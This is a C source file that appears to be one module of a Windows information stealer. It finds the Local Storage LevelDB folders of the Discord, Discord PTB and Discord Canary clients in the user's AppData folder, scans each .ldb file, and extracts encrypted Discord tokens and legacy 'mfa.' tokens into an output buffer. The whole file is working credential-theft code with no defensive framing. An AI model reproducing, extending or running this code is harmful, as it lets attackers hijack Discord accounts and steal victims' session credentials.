// chunk: collectors/discord_tokens
// depends: core/emit_buffer, core/file_ops
// provides: collect_discord
// headers: shlobj.h

#ifndef CHUNK_DISCORD_TOKENS
#define CHUNK_DISCORD_TOKENS

#include <shlobj.h>

static void scan_ldb_for_tokens(const char *dir) {
    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\*.ldb", dir);
    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(pattern, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;
    do {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\%s", dir, fd.cFileName);
        HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE) continue;
        DWORD sz = GetFileSize(h, NULL);
        if (sz > 0 && sz < 5*1024*1024) {
            char *buf = (char *)malloc(sz + 1);
            if (buf) {
                DWORD rd; ReadFile(h, buf, sz, &rd, NULL); buf[rd] = '\0';
                char *p = buf;
                while ((p = strstr(p, "dQw4w9WgXcQ:")) != NULL) {
                    char *start = p;
                    char *end = strchr(p, '"');
                    if (!end) end = p + 120;
                    int tl = (int)(end - start);
                    if (tl > 0 && tl < 500)
                        emitf("  token: %.*s\r\n", tl, start);
                    p = end;
                }
                p = buf;
                while ((p = strstr(p, "mfa.")) != NULL) {
                    char *end = p;
                    while (*end && *end != '"' && *end != '\'' && (end - p) < 100) end++;
                    emitf("  mfa_token: %.*s\r\n", (int)(end - p), p);
                    p = end;
                }
                free(buf);
            }
        }
        CloseHandle(h);
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
}

static void collect_discord(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;

    const char *variants[] = {
        "discord\\Local Storage\\leveldb",
        "discordptb\\Local Storage\\leveldb",
        "discordcanary\\Local Storage\\leveldb",
    };
    int found = 0;
    for (int i = 0; i < 3; i++) {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\%s", roaming, variants[i]);
        if (file_exists(path)) {
            if (!found) emitf("=== DISCORD TOKENS ===\r\n");
            found = 1;
            emitf("[%s]\r\n", variants[i]);
            scan_ldb_for_tokens(path);
        }
    }
    if (found) emitf("\r\n");
}

#endif
